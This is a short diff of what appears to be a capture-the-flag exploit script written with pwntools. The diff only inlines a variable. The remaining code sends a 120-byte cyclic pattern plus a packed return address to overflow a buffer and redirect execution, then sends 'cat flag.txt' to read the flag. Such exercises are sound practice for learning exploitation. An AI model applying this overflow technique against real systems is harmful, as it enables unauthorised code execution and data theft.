@@ -7,11 +7,10 @@ target.recvline() # Gimme some input
 
 
 
-x = 120
 
 
 
-target.sendline(cyclic(x)+p64(0x4011c7))
+target.sendline(cyclic(120)+p64(0x4011c7))
 
 target.sendline(b'cat flag.txt')
 print(target.recvline())
